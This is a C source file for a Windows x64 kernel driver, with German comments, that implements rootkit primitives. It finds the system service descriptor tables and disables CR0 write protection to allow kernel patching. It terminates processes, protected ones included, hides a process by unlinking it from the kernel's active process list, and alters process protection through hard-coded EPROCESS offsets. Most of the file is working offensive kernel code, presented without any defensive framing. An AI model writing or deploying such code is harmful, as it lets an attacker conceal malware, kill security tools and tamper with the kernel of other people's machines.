#include "GUtility.h"
#include "GDriver.h"

BOOLEAN bDataCompare(const UCHAR* pData, const UCHAR* bMask, const char* szMask)
{
	for (; *szMask; ++szMask, ++pData, ++bMask)
		if (*szMask == 'x' && *pData != *bMask)
			return FALSE;
	return (*szMask) == 0;
}

ULONG_PTR FindPattern(const ULONG_PTR dwAddress, const ULONG_PTR dwLen, const UCHAR *bMask, const CHAR *szMask)
{
	for (ULONG_PTR i = 0; i < dwLen; i++)
		if (bDataCompare((UCHAR*)(dwAddress + i), bMask, szMask))
			return (ULONG_PTR)(dwAddress + i);

	return 0;
}

ULONG_PTR GetKeServiceDescriptorTable64()
{
	ULONG_PTR start = (ULONG_PTR)__readmsr(0xC0000082);
	UCHAR pattern[] = { 0x4C, 0x8D, 0x15 };

	try {
		ULONG_PTR found = FindPattern(start, 0x200, pattern, "xxx");
		return *(ULONG*)(found + 3) + (ULONG_PTR)(found + 7);
	}
	except(EXCEPTION_EXECUTE_HANDLER) {
		return 0;
	}
}

ULONG_PTR GetKeServiceDescriptorTableShadow64()
{
	ULONG_PTR start = (ULONG_PTR)__readmsr(0xC0000082);
	UCHAR pattern[] = { 0x4C, 0x8D, 0x1D };

	try {
		ULONG_PTR found = FindPattern(start, 0x200, pattern, "xxx");
		return *(ULONG*)(found + 3) + (ULONG_PTR)(found + 7);
	}
	except(EXCEPTION_EXECUTE_HANDLER) {
		return 0;
	}
}

ULONG_PTR GetSDTFunctionByIndex(PSYSTEM_SERVICE_TABLE KiServiceTable, ULONG ServiceId)
{
	return (ULONG_PTR)(((ULONG*)(KiServiceTable))[ServiceId] >> 4) + (ULONG_PTR)KiServiceTable;
}

BOOLEAN IsValidAddress(PVOID src, ULONG size)
{
	PMDL mdl = NULL;

	if (!MmIsAddressValid(src))
		return FALSE;

	mdl = IoAllocateMdl(src, size, FALSE, FALSE, NULL);
	if (!mdl)
		return FALSE;

	try {
		MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
	}
	except (EXCEPTION_EXECUTE_HANDLER) {
		IoFreeMdl(mdl);
		return FALSE;
	}

	if (!MmGetSystemAddressForMdlSafe(mdl, NormalPagePriority)) {
		IoFreeMdl(mdl);
		return FALSE;
	}

	MmUnlockPages(mdl);
	IoFreeMdl(mdl);

	return TRUE;
}

BOOLEAN SafeCopyMemory(PVOID dest, PVOID src, ULONG size)
{
	PMDL mdl1 = NULL;
	PMDL mdl2 = NULL;
	PVOID address1 = NULL;
	PVOID address2 = NULL;

	if (!MmIsNonPagedSystemAddressValid(dest))
		return FALSE;

	if (!MmIsAddressValid(dest) || !MmIsAddressValid(src))
		return FALSE;

	mdl1 = IoAllocateMdl(dest, size, FALSE, FALSE, NULL);
	if (!mdl1)
		return FALSE;

	mdl2 = IoAllocateMdl(src, size, FALSE, FALSE, NULL);
	if (!mdl2)
		return FALSE;

	try {
		MmProbeAndLockPages(mdl1, KernelMode, IoModifyAccess);
		MmProbeAndLockPages(mdl2, KernelMode, IoModifyAccess);
	}
	except (EXCEPTION_EXECUTE_HANDLER) {
		IoFreeMdl(mdl1);
		IoFreeMdl(mdl2);
		return FALSE;
	}
	address1 = MmGetSystemAddressForMdlSafe(mdl1, NormalPagePriority);
	if (!address1)
		return FALSE;

	address2 = MmGetSystemAddressForMdlSafe(mdl2, NormalPagePriority);
	if (!address2)
		return FALSE;

	try {
		RtlMoveMemory(address1, address2, size);
	}
	except (EXCEPTION_EXECUTE_HANDLER){
		DbgPrint("GDriver: EXCEPTION[SafeCopyMemory]");
	}

	MmUnlockPages(mdl1);
	MmUnlockPages(mdl2);
	IoFreeMdl(mdl1);
	IoFreeMdl(mdl2);

	return TRUE;
}

KIRQL WPOFFx64()
{
	KIRQL irql = KeRaiseIrqlToDpcLevel();
	UINT64 cr0 = __readcr0();
	cr0 &= 0xfffffffffffeffff;
	__writecr0(cr0);
	_disable();
	return irql;
}

void WPONx64(KIRQL irql)
{
	UINT64 cr0 = __readcr0();
	cr0 |= 0x10000;
	_enable();
	__writecr0(cr0);
	KeLowerIrql(irql);
}

PEPROCESS LookupProcess(ULONG process_id)
{
	PEPROCESS ep = NULL; //ep + 0x2E0 = FileName
	if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)process_id, &ep)))
		return ep;
	else
		return NULL;
}

NTSTATUS TerminateProcessByProcessId(ULONG process_id)
{
	PEPROCESS ep = NULL;
	HANDLE process = NULL;
	NTSTATUS ret = STATUS_SUCCESS;

	ep = LookupProcess(process_id);
	if (!ep)
		return STATUS_UNSUCCESSFUL;

	ret = ObOpenObjectByPointer(ep, 0, 0, 1, 0, KernelMode, &process);

	if (!NT_SUCCESS(ret))
		goto here;

	if (!process)
		goto here;

	ret = pNtTerminateProcess(process, 0);
	
	pNtClose(process);

	if (NT_SUCCESS(ret))
		return ret;

	here:
	//das terminiert auch protected prozesse 
	KeAttachProcess(ep);
	ret = pNtTerminateProcess(0, 0);
	KeDetachProcess();

	return ret;
}

CHAR *GetProcessNameByProcessId(ULONG process_id)
{
	PEPROCESS pe = LookupProcess(process_id);

	if (!pe)
		return NULL;

	return pe ? PsGetProcessImageFileName(pe) : NULL;
	//return pe ? (CHAR*)((ULONG_PTR)pe + 0x2E0) : NULL;
}

/*
	PEPROCESS struct content ist undefiniert unter x64, warum auch immer.
	Habe auch nichts online gefunden.

	Reversed:
		Process Id				0x180(QWORD)/0x184(DWORD)
		CHAR *name				0x2E0
		ActiveProcessLinks		0x188
		

*/

VOID UnlinkProcess(ULONG process_id)
{
	PEPROCESS ep = LookupProcess(process_id);
	if (ep) {
		PLIST_ENTRY cur = (PLIST_ENTRY)((ULONG_PTR)ep + 0x188);
		PLIST_ENTRY prev = cur->Blink;
		PLIST_ENTRY next = cur->Flink;

		prev->Flink = cur->Flink;
		next->Blink = cur->Blink;

		cur->Flink = cur;
		cur->Blink = cur;
	}
}

VOID ProtectProcess(ULONG process_id)
{
	PEPROCESS ep = LookupProcess(process_id);
	if (!ep)
		return;

	*(PULONG)((ULONG_PTR)ep + 0x440) = 0;
}